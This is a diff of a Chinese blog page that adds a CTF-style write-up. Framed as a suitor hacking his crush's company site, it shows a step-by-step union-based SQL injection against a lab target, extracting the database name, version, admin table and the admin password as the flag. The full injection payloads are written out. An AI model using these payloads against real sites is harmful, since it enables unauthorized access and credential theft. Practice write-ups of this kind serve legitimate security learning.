@@ -570,21 +570,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-11-02
+                    2020-11-08
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    535
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -599,7 +599,33 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <p>2020年11月8日21:14​ ​ ​ :underage:</p>
+<p>尤里正在追女神小芳，在得知小芳开了一家公司后，尤里通过whois查询发现了小芳公司网站<br>学过一点黑客技术的他，想在女神面前炫炫技。于是他打开了<a target="_blank" rel="noopener" href="http://59.63.200.79:8003/">http://59.63.200.79:8003/</a> 。</p>
+<p><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/index.php?id=1">http://59.63.200.79:8003/index.php?id=1</a> ，</p>
+<p>第一步：判断是否存在sql注入漏洞</p>
+<p>构造 ?id=1 and 1=1  ,回车 ，页面返回正常。</p>
+<p>再构造  ?id=1 and 1=2 ，回车，页面返回错误。初步判断 这里可能存在一个注入漏洞。</p>
+<p>第二步：判断字段数</p>
+<p>构造 ?id=1 and 1=1 order by 1  ,回车，页面正常。</p>
+<p>再构造 ?id=1 and 1=1 order by 2 ，回车 ，页面正常。</p>
+<p>再构造 ?id=1 and 1=1 order by 3 ,回车 ，页面返回 错误 ，判断 字段数为 2</p>
+<p>第三步：判断回显点</p>
+<p>构造 ?id=1 and 1=2 union select 1,2    ,页面出现了 2 ，说明我们可以在数字 2 处显示我们想要的内容。</p>
+<p>第四步：查询相关内容</p>
+<p>1、查询当前数据库名 </p>
+<p>构造 ?id=1 and 1=2 union select 1,database()  ,回车，显示数据库名称 maoshe</p>
+<p>2、查询当前数据库版本 </p>
+<p>构造 ?id=1 and 1=2 union select 1,version()  ，回车，显示数据版本5.5.53</p>
+<p>3、查询数据库表名</p>
+<p>构造 ?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1    ,回车，显示 admin  绝大多数情况下，管理员的账号密码都在admin表里。</p>
+<p>4、查询字段名</p>
+<p>构造 ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 0,1  ，回车  ，显示 id ，limit 1,1 显示 uesername ,  limit 2,1 显示 password。 查出admin表 有三个字段 。    ps:注意 limit 0,1  和 1,1 和 2,1 …才是显示正确的（不知道为什么）</p>
+<p>5、查询字段内容</p>
+<p>构造 ?id=1 and 1=2 union select 1,username from admin limit 0,1   ，回车，显示 admin .如果limit 1,1 没有显示，说明只有一个用户。</p>
+<p>再构造 ?id=1 and 1=2 union select 1,password from admin limit 0,1 ，回车，显示 hellohack。</p>
+<p>最后提交Flag  :hellohack </p>
+<p>ok</p>
+
             </div>
             <hr/>
 
@@ -1389,7 +1415,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">2.9k</span>&nbsp;字
+                class="white-color">4.3k</span>&nbsp;字
             
             
             
